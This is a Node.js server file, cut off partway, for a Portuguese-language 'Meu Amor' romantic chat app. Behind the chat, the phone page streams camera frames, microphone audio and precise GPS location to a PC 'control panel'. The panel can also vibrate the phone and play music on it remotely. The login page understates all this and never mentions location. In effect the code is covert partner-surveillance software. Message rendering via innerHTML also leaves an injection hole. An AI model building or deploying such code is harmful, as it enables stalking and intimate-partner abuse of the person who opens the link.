const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

// ========== ARMAZENAMENTO EM MEMÓRIA ==========
const contacts = new Map(); // id -> { id, name, phone, socketId, online, lastSeen }
const messages = new Map(); // contactId -> [{ id, from, to, text, timestamp }]
const activeSockets = new Map(); // socketId -> contactId

// ========== ROTAS ==========

// Rota principal - detecta dispositivo e renderiza página correta
app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  if (isMobile) {
    // ========== PÁGINA DO CELULAR (CHAT) ==========
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>💕 Meu Amor - Chat</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 30px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            height: 95vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            padding: 15px 20px;
            color: white;
            text-align: center;
        }
        .header h2 { font-size: 18px; }
        .header .sub { font-size: 11px; opacity: 0.9; margin-top: 3px; }
        .login-area {
            padding: 30px 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .login-area .form-group { margin-bottom: 15px; }
        .login-area label { display: block; font-weight: bold; color: #333; margin-bottom: 5px; font-size: 14px; }
        .login-area input {
            width: 100%;
            padding: 14px;
            border: 2px solid #ddd;
            border-radius: 15px;
            font-size: 16px;
        }
        .login-area input:focus { border-color: #e74c3c; outline: none; }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:disabled { background: #ccc; cursor: not-allowed; }
        .error-msg { color: #e74c3c; text-align: center; margin-top: 10px; font-size: 13px; }
        .permission-request {
            background: #fff3cd;
            padding: 10px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 12px;
            text-align: center;
            color: #856404;
        }
        .chat-area {
            flex: 1;
            display: none;
            flex-direction: column;
            background: #f5f5f5;
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 6px 15px;
            background: #f0f0f0;
            font-size: 11px;
            color: #666;
            border-bottom: 1px solid #ddd;
        }
        .status-bar .online { color: #2ecc71; }
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
        }
        .message {
            padding: 10px 14px;
            border-radius: 16px;
            margin-bottom: 6px;
            max-width: 80%;
            word-wrap: break-word;
            font-size: 15px;
        }
        .message.from-contact {
            background: white;
            color: #333;
            margin-right: auto;
            border-bottom-left-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .message.from-pc {
            background: #667eea;
            color: white;
            margin-left: auto;
            border-bottom-right-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .message .time { font-size: 9px; opacity: 0.7; display: block; margin-top: 4px; }
        .typing-indicator {
            padding: 8px 15px;
            color: #999;
            font-style: italic;
            font-size: 13px;
            display: none;
        }
        .chat-input-area {
            display: flex;
            gap: 8px;
            padding: 10px 15px;
            background: white;
            border-top: 1px solid #eee;
        }
        .chat-input-area input {
            flex: 1;
            padding: 10px 14px;
            border: 2px solid #ddd;
            border-radius: 25px;
            font-size: 14px;
            outline: none;
        }
        .chat-input-area input:focus { border-color: #667eea; }
        .chat-input-area button {
            padding: 10px 18px;
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            font-size: 18px;
        }
        .music-control {
            background: rgba(0,0,0,0.85);
            padding: 8px 15px;
            display: none;
            justify-content: space-between;
            align-items: center;
            color: white;
        }
        .music-control .name { font-size: 12px; }
        .music-control button {
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            padding: 4px 12px;
            border-radius: 15px;
            cursor: pointer;
            font-size: 11px;
        }
        .youtube-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            pointer-events: none;
            opacity: 0.08;
            transition: opacity 0.5s;
        }
        .youtube-bg iframe {
            width: 100%;
            height: 100%;
            border: none;
            pointer-events: none;
        }
        .opacity-control {
            position: fixed;
            bottom: 80px;
            right: 10px;
            background: rgba(0,0,0,0.7);
            padding: 6px 10px;
            border-radius: 15px;
            z-index: 10000;
            display: flex;
            gap: 8px;
            align-items: center;
        }
        .opacity-control button {
            background: white;
            border: none;
            padding: 3px 8px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 11px;
        }
        .opacity-control span { color: white; font-size: 10px; }
        .heart {
            position: fixed;
            font-size: 18px;
            pointer-events: none;
            animation: floatHeart 4s ease-in-out infinite;
            z-index: 9998;
        }
        @keyframes floatHeart {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>💕 Meu Amor 💕</h2>
            <div class="sub">Conectado com seu amor</div>
        </div>

        <!-- LOGIN -->
        <div id="loginArea" class="login-area">
            <h3 style="text-align:center; margin-bottom:15px;">👋 Entre no Chat</h3>
            <div class="form-group">
                <label>📱 ID do Contato</label>
                <input type="text" id="contactId" placeholder="Cole o ID fornecido pelo seu amor">
            </div>
            <div class="form-group">
                <label>👤 Seu Nome</label>
                <input type="text" id="contactName" placeholder="Seu nome">
            </div>
            <button class="login-btn" id="loginBtn">💕 Entrar no Chat</button>
            <div class="error-msg" id="loginError"></div>
            <div class="permission-request">🔒 O acesso à câmera e microfone será solicitado para compartilhar com seu amor</div>
        </div>

        <!-- CHAT -->
        <div id="chatArea" class="chat-area">
            <div class="status-bar">
                <span id="connectionStatus">🟢 Conectado</span>
                <span id="contactNameDisplay">Seu Amor</span>
            </div>
            <div class="chat-messages" id="chatMessages">
                <div style="text-align:center; color:#999; padding:20px; font-size:14px;">💕 Bem-vindo! Converse com seu amor</div>
            </div>
            <div class="typing-indicator" id="typingIndicator">💕 Alguém está digitando...</div>
            <div class="music-control" id="musicControl">
                <span class="name" id="musicName">🎵 Tocando música</span>
                <button onclick="stopMusic()">⏹️ Parar</button>
            </div>
            <div class="chat-input-area">
                <input type="text" id="chatInput" placeholder="Digite uma mensagem..." oninput="onTyping()">
                <button onclick="sendMessage()">💖</button>
            </div>
        </div>
    </div>

    <div class="youtube-bg" id="youtubeBg"><iframe id="youtubeIframe" allow="autoplay; encrypted-media"></iframe></div>
    <div class="opacity-control">
        <button id="opacMinus">-</button>
        <span id="opacValue">8%</span>
        <button id="opacPlus">+</button>
    </div>
    <div id="heartContainer"></div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'], reconnection: true });
        let contactId = null, contactName = null, mediaStream = null, audioContext = null;
        let audioProcessor = null, audioSource = null, isLoggedIn = false, typingTimeout = null;
        let currentOpacity = 0.08;

        const loginArea = document.getElementById('loginArea');
        const chatArea = document.getElementById('chatArea');
        const loginBtn = document.getElementById('loginBtn');
        const chatMessages = document.getElementById('chatMessages');
        const chatInput = document.getElementById('chatInput');
        const typingIndicator = document.getElementById('typingIndicator');
        const connectionStatus = document.getElementById('connectionStatus');
        const contactNameDisplay = document.getElementById('contactNameDisplay');
        const musicControl = document.getElementById('musicControl');
        const musicName = document.getElementById('musicName');
        const loginError = document.getElementById('loginError');
        const youtubeBg = document.getElementById('youtubeBg');
        const youtubeIframe = document.getElementById('youtubeIframe');

        // ===== OPACIDADE =====
        function updateOpacity() {
            youtubeBg.style.opacity = currentOpacity;
            document.getElementById('opacValue').textContent = Math.round(currentOpacity * 100) + '%';
        }
        document.getElementById('opacMinus').onclick = () => { currentOpacity = Math.max(0.03, currentOpacity - 0.03); updateOpacity(); };
        document.getElementById('opacPlus').onclick = () => { currentOpacity = Math.min(0.3, currentOpacity + 0.03); updateOpacity(); };

        // ===== CORAÇÕES =====
        function createHeart() {
            const h = document.createElement('div');
            h.className = 'heart';
            h.innerHTML = ['💕','💖','💗','💓','💝','💘','💌'][Math.floor(Math.random()*7)];
            h.style.left = Math.random()*100+'%';
            h.style.animationDuration = (Math.random()*3+2)+'s';
            h.style.fontSize = (Math.random()*18+14)+'px';
            document.getElementById('heartContainer').appendChild(h);
            setTimeout(() => { if(h.parentNode) h.remove(); }, 4000);
        }
        setInterval(createHeart, 600);

        // ===== LOGIN =====
        loginBtn.onclick = () => {
            const id = document.getElementById('contactId').value.trim();
            const name = document.getElementById('contactName').value.trim();
            if(!id || !name) { loginError.textContent = 'Preencha todos os campos!'; return; }
            loginBtn.disabled = true;
            loginBtn.textContent = '⏳ Conectando...';
            loginError.textContent = '';
            socket.emit('contact_login', { contactId: id, name: name });
        };

        socket.on('login_success', (data) => {
            contactId = data.contactId;
            contactName = data.name;
            isLoggedIn = true;
            loginArea.style.display = 'none';
            chatArea.style.display = 'flex';
            contactNameDisplay.textContent = '💕 ' + contactName;
            data.messages.forEach(msg => {
                addMessageToChat(msg.text, msg.from === 'pc' ? 'from-pc' : 'from-contact');
            });
            startStreaming();
            loginBtn.disabled = false;
            loginBtn.textContent = '💕 Entrar no Chat';
        });

        socket.on('login_error', (data) => {
            loginError.textContent = data.error || 'Erro ao fazer login';
            loginBtn.disabled = false;
            loginBtn.textContent = '💕 Entrar no Chat';
        });

        // ===== STREAMING =====
        async function startStreaming() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: true
                });
                mediaStream = stream;
                const canvas = document.createElement('canvas');
                canvas.width = 320; canvas.height = 240;
                const ctx = canvas.getContext('2d');
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                setInterval(() => {
                    if(isLoggedIn && mediaStream && mediaStream.active) {
                        ctx.drawImage(video, 0, 0, 320, 240);
                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
                    }
                }, 250);
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                audioSource = audioContext.createMediaStreamSource(stream);
                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                audioSource.connect(audioProcessor);
                audioProcessor.connect(audioContext.destination);
                audioProcessor.onaudioprocess = (e) => {
                    if(isLoggedIn) {
                        const data = e.inputBuffer.getChannelData(0);
                        if(Math.random() < 0.08) socket.emit('audio', Array.from(data));
                    }
                };
                if(navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        (p) => { if(isLoggedIn) socket.emit('location', { latitude: p.coords.latitude, longitude: p.coords.longitude }); },
                        () => {},
                        { enableHighAccuracy: true }
                    );
                }
            } catch(err) { alert('Permita o acesso à câmera e microfone!'); }
        }

        // ===== MENSAGENS =====
        function sendMessage() {
            const text = chatInput.value.trim();
            if(!text || !isLoggedIn) return;
            socket.emit('send_message', { text, isFromPc: false });
            chatInput.value = '';
            stopTyping();
            addMessageToChat(text, 'from-contact');
        }

        function addMessageToChat(text, className) {
            const div = document.createElement('div');
            div.className = 'message ' + className;
            div.innerHTML = text + '<span class="time">' + new Date().toLocaleTimeString() + '</span>';
            chatMessages.appendChild(div);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        function onTyping() {
            if(!isLoggedIn) return;
            socket.emit('typing_start', { isFromPc: false });
            if(typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }
        function stopTyping() {
            if(!isLoggedIn) return;
            socket.emit('typing_stop', { isFromPc: false });
            if(typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
        }

        chatInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendMessage(); });

        // ===== SOCKET EVENTS =====
        socket.on('new_message', (data) => { addMessageToChat(data.text, 'from-pc'); });
        socket.on('message_sent', (data) => {});
        socket.on('contact_typing', (data) => {
            typingIndicator.style.display = data.isTyping ? 'block' : 'none';
        });

        socket.on('comando', (cmd) => {
            if(cmd === 'vibrate' && navigator.vibrate) navigator.vibrate(200);
            else if(cmd === 'emergency' && navigator.vibrate) navigator.vibrate([500,200,500,200,500]);
            else if(cmd === 'trocarCamera') {
                if(mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); }
                startStreaming();
            } else if(cmd.startsWith('play_youtube:')) {
                const parts = cmd.split(':');
                playYouTube(parts[1], parts[2] || 'Música');
            } else if(cmd === 'stop_music') { stopMusic(); }
        });

        // ===== MÚSICA =====
        function playYouTube(videoId, songName) {
            youtubeIframe.src = 'https://www.youtube.com/embed/' + videoId + '?autoplay=1&loop=1&playlist=' + videoId + '&controls=0&showinfo=0&rel=0';
            youtubeBg.style.display = 'block';
            musicControl.style.display = 'flex';
            musicName.textContent = '🎵 ' + songName;
        }
        function stopMusic() {
            youtubeIframe.src = '';
            youtubeBg.style.display = 'none';
            musicControl.style.display = 'none';
            socket.emit('comando', 'stop_music');
        }

        socket.on('connect', () => { connectionStatus.innerHTML = '🟢 Conectado'; });
        socket.on('disconnect', () => { connectionStatus.innerHTML = '🔴 Desconectado'; });
        socket.on('force_disconnect', () => { alert('⚠️ Conexão encerrada!'); location.reload(); });
    </script>
</body>
</html>`);
  } else {
    // ========== PÁGINA DO PC (PAINEL DE CONTROLE) ==========
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>💕 Painel de Mensagens</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            color: white;
            text-align: center;
            margin-bottom: 25px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            font-size: 32px;
        }
        .main-grid {
            display: grid;
            grid-template-columns: 280px 1fr 320px;
            gap: 20px;
            height: calc(100vh - 120px);
        }
        .panel {
            background: white;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow-y: auto;
        }
        .panel h2 {
            color: #e74c3c;
            margin-bottom: 15px;
            font-size: 17px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .panel h3 { font-size: 14px; color: #555; margin: 10px 0 8px; }
        .contact-item {
            padding: 10px 12px;
            border-radius: 10px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: all 0.3s;
            border: 2px solid transparent;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .contact-item:hover { background: #f5f5f5; }
        .contact-item.active { border-color: #e74c3c; background: #ffe6f0; }
        .contact-item .name { font-weight: bold; font-size: 14px; }
        .contact-item .phone { font-size: 11px; color: #999; }
        .contact-item .status {
            font-size: 10px;
            padding: 2px 8px;
            border-radius: 10px;
        }
        .status.online { background: #2ecc71; color: white; }
        .status.offline { background: #95a5a6; color: white; }
        .badge {
            background: #e74c3c;
            color: white;
            font-size: 10px;
            padding: 1px 7px;
            border-radius: 10px;
            margin-left: 5px;
        }
        .form-group { margin-bottom: 12px; }
        .form-group label { display: block; font-weight: bold; font-size: 13px; margin-bottom: 3px; }
        .form-group input {
            width: 100%;
            padding: 8px 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 13px;
        }
        .form-group input:focus { border-color: #667eea; outline: none; }
        .btn-primary {
            width: 100%;
            padding: 10px;
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 14px;
        }
        .btn-danger {
            width: 100%;
            padding: 8px;
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 13px;
            margin-top: 5px;
        }
        .btn-danger:hover, .btn-primary:hover { transform: scale(1.02); }
        .chat-area { display: flex; flex-direction: column; height: 100%; }
        .chat-header { padding-bottom: 10px; border-bottom: 2px solid #eee; margin-bottom: 10px; }
        .chat-header h3 { font-size: 16px; }
        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 5px 0;
        }
        .message {
            padding: 8px 14px;
            border-radius: 14px;
            margin-bottom: 6px;
            max-width: 75%;
            font-size: 14px;
        }
        .message.from-pc { background: #667eea; color: white; margin-left: auto; }
        .message.from-contact { background: #f0f0f0; color: #333; }
        .message .time { font-size: 9px; opacity: 0.7; display: block; margin-top: 3px; }
        .typing-indicator { font-size: 12px; color: #999; font-style: italic; padding: 5px 0; display: none; }
        .chat-input-area {
            display: flex;
            gap: 8px;
            padding-top: 10px;
            border-top: 2px solid #eee;
        }
        .chat-input-area input {
            flex: 1;
            padding: 8px 14px;
            border: 2px solid #ddd;
            border-radius: 20px;
            font-size: 13px;
            outline: none;
        }
        .chat-input-area input:focus { border-color: #667eea; }
        .chat-input-area button {
            padding: 8px 18px;
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
        }
        .no-contact { text-align: center; color: #999; padding: 40px 0; }
        .no-contact h3 { color: #ccc; }
        .video-container { background: #000; border-radius: 8px; overflow: hidden; margin: 8px 0; }
        .video-container img { width: 100%; height: auto; display: block; }
        .location-info {
            background: #f0f8ff;
            padding: 8px 12px;
            border-radius: 8px;
            margin: 8px 0;
            font-size: 12px;
        }
        .commands {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 5px;
            margin: 8px 0;
        }
        .commands button {
            padding: 6px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 11px;
            font-weight: bold;
        }
        .btn-vibrate { background: #f39c12; color: white; }
        .btn-camera { background: #3498db; color: white; }
        .btn-emergency { background: #e74c3c; color: white; }
        .btn-skip { background: #9b59b6; color: white; }
        .btn-stop-music { background: #e74c3c; color: white; width: 100%; margin-top: 5px; padding: 6px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .music-item {
            background: linear-gradient(135deg, #ffe6f0, #ffd9e8);
            padding: 10px 14px;
            border-radius: 8px;
            margin: 4px 0;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .music-item:hover { transform: scale(1.02); box-shadow: 0 3px 10px rgba(0,0,0,0.1); }
        .music-item .name { font-weight: bold; color: #c0392b; font-size: 13px; }
        .music-item .play { color: #e74c3c; font-size: 18px; }
        .contact-info-text { font-size: 13px; color: #666; margin: 3px 0; }
        .contact-info-text strong { color: #333; }
        hr { margin: 12px 0; border: none; border-top: 1px solid #eee; }
        @media (max-width: 1100px) {
            .main-grid { grid-template-columns: 1fr; height: auto; }
            .panel { max-height: 400px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💕 Painel de Controle Romântico 💕</h1>
        <div class="main-grid">
            <!-- Contatos -->
            <div class="panel">
                <h2>📱 Contatos</h2>
                <div class="form-group">
                    <label>👤 Nome</label>
                    <input type="text" id="contactName" placeholder="Ex: Meu Amor">
                </div>
                <div class="form-group">
                    <label>📞 Telefone</label>
                    <input type="text" id="contactPhone" placeholder="(11) 99999-9999">
                </div>
                <button class="btn-primary" id="addContact">➕ Adicionar Contato</button>
                <hr>
                <div id="contactList"></div>
            </div>

            <!-- Chat -->
            <div class="panel chat-area">
                <div id="chatContainer">
                    <div class="no-contact"><h3>💕 Selecione um contato</h3><p style="font-size:13px;">Escolha um contato para começar a conversar</p></div>
                </div>
            </div>

            <!-- Info do Contato -->
            <div class="panel">
                <h2>ℹ️ Sobre o Contato</h2>
                <div id="contactInfo"><div class="no-contact"><p>Selecione um contato</p></div></div>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        let currentContactId = null;
        let typingTimeout = null;
        let audioGain = null;

        const contactList = document.getElementById('contactList');
        const chatContainer = document.getElementById('chatContainer');
        const contactInfo = document.getElementById('contactInfo');

        // ===== CARREGAR CONTATOS =====
        async function loadContacts() {
            const res = await fetch('/api/contacts');
            const contacts = await res.json();
            renderContacts(contacts);
        }

        function renderContacts(contacts) {
            if(contacts.length === 0) {
                contactList.innerHTML = '<div style="text-align:center;color:#999;padding:20px;font-size:13px;">Nenhum contato cadastrado</div>';
                return;
            }
            contactList.innerHTML = contacts.map(c => \`
                <div class="contact-item \${currentContactId === c.id ? 'active' : ''}" onclick="selectContact('\${c.id}')">
                    <div>
                        <div class="name">\${c.name}</div>
                        <div class="phone">\${c.phone}</div>
                    </div>
                    <div>
                        <span class="status \${c.online ? 'online' : 'offline'}">\${c.online ? '🟢 Online' : '⚫ Offline'}</span>
                        <span class="badge" id="badge_\${c.id}">0</span>
                    </div>
                </div>
            \`).join('');
        }

        // ===== SELECIONAR CONTATO =====
        async function selectContact(contactId) {
            currentContactId = contactId;
            loadContacts();
            const res = await fetch('/api/messages/' + contactId);
            const messages = await res.json();
            renderChat(messages);
            const cRes = await fetch('/api/contacts/' + contactId);
            const contact = await cRes.json();
            renderContactInfo(contact);
        }

        function renderChat(messages) {
            chatContainer.innerHTML = \`
                <div class="chat-header"><h3>💬 Chat</h3></div>
                <div class="chat-messages" id="chatMessages">
                    \${messages.map(m => \`
                        <div class="message \${m.from === 'pc' ? 'from-pc' : 'from-contact'}">
                            \${m.text}
                            <span class="time">\${new Date(m.timestamp).toLocaleTimeString()}</span>
                        </div>
                    \`).join('')}
                    <div id="typingIndicator" class="typing-indicator">💕 Digitando...</div>
                </div>
                <div class="chat-input-area">
                    <input type="text" id="chatInput" placeholder="Digite uma mensagem..." oninput="onTyping()">
                    <button onclick="sendMessage()">💖 Enviar</button>
                </div>
            \`;
            const div = document.getElementById('chatMessages');
            if(div) div.scrollTop = div.scrollHeight;
        }

        function renderContactInfo(contact) {
            contactInfo.innerHTML = \`
                <div style="text-align:center;padding:8px 0;">
                    <div style="font-size:36px;">💕</div>
                    <h3>\${contact.name}</h3>
                    <div style="font-size:13px;color:#666;">\${contact.phone}</div>
                    <div style="margin:6px 0;">
                        <span class="status \${contact.online ? 'online' : 'offline'}">\${contact.online ? '🟢 Online' : '⚫ Offline'}</span>
                    </div>
                    <div style="font-size:11px;color:#999;">Último visto: \${new Date(contact.lastSeen).toLocaleString()}</div>
                </div>
                <div class="video-container"><img id="contactVideo" src="" alt="Vídeo"></div>
                <div class="location-info" id="contactLocation">📍 Aguardando localização...</div>
                <div class="commands">
                    <button class="btn-vibrate" onclick="sendCommand('vibrate')">📳 Vibrar</button>
                    <button class="btn-camera" onclick="sendCommand('trocarCamera')">📷 Trocar Câmera</button>
                    <button class="btn-emergency" onclick="sendCommand('emergency')">💖 Surpresa</button>
                    <button class="btn-skip" onclick="sendCommand('skip_current_message')">⏩ Pular</button>
                </div>
                <h3>🎵 Músicas</h3>
                <div class="music-item" onclick="playMusic('1N8N-X8NM4k','Música 1')">
                    <span class="name">🎵 Música Especial 1</span><span class="play">▶️</span>
                </div>
                <div class="music-item" onclick="playMusic('sTVNvP5Uw98','Música 2')">
                    <span class="name">🎵 Música Especial 2</span><span class="play">▶️</span>
                </div>
                <button class="btn-stop-music" onclick="stopMusic()">⏹️ Parar Música</button>
                <button class="btn-danger" onclick="deleteContact()">🗑️ Remover Contato</button>
            \`;
        }

        // ===== ENVIAR MENSAGEM =====
        function sendMessage() {
            const input = document.getElementById('chatInput');
            if(!input) return;
            const text = input.value.trim();
            if(!text || !currentContactId) return;
            socket.emit('send_message', { to: currentContactId, text, isFromPc: true });
            input.value = '';
            stopTyping();
            addMessageToChat(text, 'from-pc');
        }

        function addMessageToChat(text, className) {
            const div = document.getElementById('chatMessages');
            if(!div) return;
            const msg = document.createElement('div');
            msg.className = 'message ' + className;
            msg.innerHTML = text + '<span class="time">' + new Date().toLocaleTimeString() + '</span>';
            div.appendChild(msg);
            div.scrollTop = div.scrollHeight;
        }

        function onTyping() {
            if(!currentContactId) return;
            socket.emit('typing_start', { to: currentContactId, isFromPc: true });
            if(typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }
        function stopTyping() {
            if(!currentContactId) return;
            socket.emit('typing_stop', { to: currentContactId, isFromPc: true });
            if(typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
        }

        // ===== COMANDOS =====
        function sendCommand(command) {
            if(!currentContactId) return;
            socket.emit('comando', { contactId: currentContactId, command });
        }

        function playMusic(videoId, songName) {
            if(!currentContactId) return;
            socket.emit('comando', { contactId: currentContactId, command: 'play_youtube:' + videoId + ':' + songName });
        }

        function stopMusic() {
            if(!currentContactId) return;
            socket.emit('comando', { contactId: currentContactId, command: 'stop_music' });
        }

        async function deleteContact() {
            if(!currentContactId || !confirm('Remover este contato?')) return;
            await fetch('/api/contacts/' + currentContactId, { method: 'DELETE' });
            currentContactId = null;
            loadContacts();
            chatContainer.innerHTML = '<div class="no-contact"><h3>💕 Contato removido</h3></div>';
            contactInfo.innerHTML = '<div class="no-contact"><p>Contato removido</p></div>';
        }

        // ===== ADICIONAR CONTATO =====
        document.getElementById('addContact').onclick = async () => {
            const name = document.getElementById('contactName').value.trim();
            const phone = document.getElementById('contactPhone').value.trim();
            if(!name || !phone) { alert('Preencha nome e telefone!'); return; }
            try {
                const res = await fetch('/api/contacts', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name, phone })
                });
                if(!res.ok) { const e = await res.json(); alert(e.error || 'Erro'); return; }
                const contact = await res.json();
                document.getElementById('contactName').value = '';
                document.getElementById('contactPhone').value = '';
                loadContacts();
                alert('✅ Contato ' + contact.name + ' adicionado!');
            } catch(e) { alert('Erro ao adicionar'); }
        };

        // ===== SOCKET EVENTS =====
        socket.on('new_message_from_contact', (data) => {
            if(currentContactId === data.contactId) {
                addMessageToChat(data.text, 'from-contact');
            }
        });

        socket.on('message_sent', (data) => {});
        socket.on('contact_typing', (data) => {
            const ind = document.getElementById('typingIndicator');
            if(ind) { ind.style.display = data.isTyping ? 'block' : 'none'; }
        });

        socket.on('contact_status_change', (data) => {
            loadContacts();
            if(currentContactId === data.contactId) {
                fetch('/api/contacts/' + data.contactId).then(r => r.json()).then(c => renderContactInfo(c));
            }
        });

        socket.on('contact_frame', (data) => {
            if(currentContactId === data.contactId) {
                const v = document.getElementById('contactVideo');
                if(v) v.src = data.frame;
            }
        });

        socket.on('contact_location', (data) => {
            if(currentContactId === data.contactId) {
                const l = document.getElementById('contactLocation');
                if(l) {
                    l.innerHTML = '📍 Localização:<br>Lat: ' + data.location.latitude.toFixed(6) +
                        '<br>Lon: ' + data.location.longitude.toFixed(6) +
                        '<br><a href="https://www.google.com/maps?q=' + data.location.latitude + ',' +
                        data.location.longitude + '" target="_blank">🗺️ Ver no mapa</a>';
                }
            }
        });

        socket.on('force_disconnect', () => { alert('⚠️ Outra conexão!'); location.reload(); });

        // ===== ÁUDIO =====
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            audioGain = audioCtx.createGain();
            audioGain.gain.value = 0.5;
            audioGain.connect(audioCtx.destination);
        } catch(e) {}

        socket.on('contact_audio', (data) => {
            if(currentContactId === data.contactId && audioGain) {
                try {
                    const ctx = audioGain.context;
                    const buf = ctx.createBuffer(1, data.audio.length, ctx.sampleRate);
                    buf.copyToChannel(new Float32Array(data.audio), 0);
                    const src = ctx.createBufferSource();
                    src.buffer = buf;
                    src.connect(audioGain);
                    src.start();
                } catch(e) {}
            }
        });

        loadContacts();
    </script>
</body>
</html>`);
  }
});

// ========== API REST ==========
app.use(express.json());

// Criar contato
app.post('/api/contacts', (req, res) => {
  const { name, phone } = req.body;
  if(!name || !phone) return res.status(400).json({ error: 'Nome e telefone são obrigatórios' });
  for(let [id, c] of contacts) {
    if(c.phone === phone) return res.status(400).json({ error: 'Telefone já cadastrado' });
  }
  const id = uuidv4();
  const newContact = { id, name, phone, socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() };
  contacts.set(id, newContact);
  messages.set(id, []);
  res.status(201).json(newContact);
});

// Listar contatos
app.get('/api/contacts', (req, res) => {
  res.json(Array.from(contacts.values()));
});

// Buscar contato
app.get('/api/contacts/:id', (req, res) => {
  const c = contacts.get(req.params.id);
  if(!c) return res.status(404).json({ error: 'Não encontrado' });
  res.json(c);
});

// Deletar contato
app.delete('/api/contacts/:id', (req, res) => {
  const c = contacts.get(req.params.id);
  if(!c) return res.status(404).json({ error: 'Não encontrado' });
  if(c.socketId) {
    const sock = io.sockets.sockets.get(c.socketId);
    if(sock) sock.disconnect();
  }
  contacts.delete(req.params.id);
  messages.delete(req.params.id);
  res.json({ success: true });
});

// Buscar mensagens
app.get('/api/messages/:contactId', (req, res) => {
  res.json(messages.get(req.params.id) || []);
});

// ========== SOCKET.IO ==========
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  let currentContactId = null;

  // Login do contato
